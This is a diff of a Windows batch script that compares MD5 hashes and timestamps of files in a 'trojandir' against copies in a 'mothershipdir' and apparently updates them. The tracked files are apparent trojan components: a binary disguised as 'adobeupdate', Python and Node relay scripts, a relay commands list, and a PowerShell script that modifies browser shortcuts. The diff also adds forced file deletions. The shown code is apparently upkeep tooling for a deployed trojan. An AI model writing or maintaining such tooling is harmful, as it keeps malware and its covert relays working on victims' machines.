@@ -27,30 +27,18 @@ del /f /q tpl_launch.cmd_wmic_process_*
 del /f /q *.json
 del /f /q *.xml
 del /f /q download_*
+del /f /q *.MD5
 
-set adobeupdate=%trojandir%\adobeupdate
-set madobeupdate=%mothershipdir%\adobeupdate
-set pythonrelay=%trojandir%\pythonrelay.py
-set mpythonrelay=%mothershipdir%\pythonrelay.py
-set pythonhostrelay=%trojandir%\pythonhostrelay.py
-set mpythonhostrelay=%mothershipdir%\pythonhostrelay.py
-set nodehostrelay=%trojandir%\nodehostrelay.js
-set mnodehostrelay=%mothershipdir%\nodehostrelay.js
-set nodehostrelaycmds=%trojandir%\nodehostrelay.cmdslist.js
-set mnodehostrelaycmds=%mothershipdir%\nodehostrelay.cmdslist.js
-set nodehostrelayhelper=%trojandir%\nodehostrelayhelper.js
-set mnodehostrelayhelper=%mothershipdir%\nodehostrelayhelper.js
-
-set files_list=adobeupdate pythonrelay pythonhostrelay nodehostrelay nodehostrelaycmds nodehostrelayhelper
+set files_list=adobeupdate pythonrelay.py pythonhostrelay.py nodehostrelay.js nodehostrelay.cmdslist.js nodehostrelayhelper.js modify_browser_lnk_tpl.ps1
 
 color 0A
 for %%f in (%files_list%) do (
-    REM echo Item: !%%f! !m%%f!
-    certutil -hashfile !%%f! MD5 | find /v ":" > !%%f!.MD5
-    certutil -hashfile !m%%f! MD5 | find /v ":" > !m%%f!.MD5
+    REM echo Item: %%f
+    certutil -hashfile %trojandir%\%%f MD5 | find /v ":" > %trojandir%\%%f.MD5
+    certutil -hashfile %mothershipdir%\%%f MD5 | find /v ":" > %temp%\%%f.MD5
     
-    set /p %%fMD5=<!%%f!.MD5
-    set /p m%%fMD5=<!m%%f!.MD5
+    set /p %%fMD5=<%trojandir%\%%f.MD5
+    set /p m%%fMD5=<%temp%\%%f.MD5
 
     for /f "delims=" %%A in ("%%fMD5") do (
         
@@ -61,8 +49,8 @@ for %%f in (%files_list%) do (
 
     )
 
-    for %%i in ("!%%f!") do set "%%fdt=%%~ti"
-    for %%i in ("!m%%f!") do set "m%%fdt=%%~ti"
+    for %%i in ("%trojandir%\%%f") do set "%%fdt=%%~ti"
+    for %%i in ("%mothershipdir%\%%f") do set "m%%fdt=%%~ti"
     
     REM echo !%%fdt!
     REM echo !m%%fdt!
@@ -77,11 +65,9 @@ for %%f in (%files_list%) do (
         set mcheck=WARN
     )
 
-    for %%I in ("!m%%f!") do set "filename_with_ext=%%~nxI"
-
-    echo %%f !filename_with_ext! 
-    echo mot !%%fMD5! !%%fdt! 
-    echo owd !m%%fMD5! !m%%fdt! 
+    echo %%f
+    echo mot !m%%fMD5! !m%%fdt! 
+    echo owd !%%fMD5! !%%fdt! 
     echo MD5 !check! mod-dt !mcheck!
 
     IF "%update%"=="TRUE" (
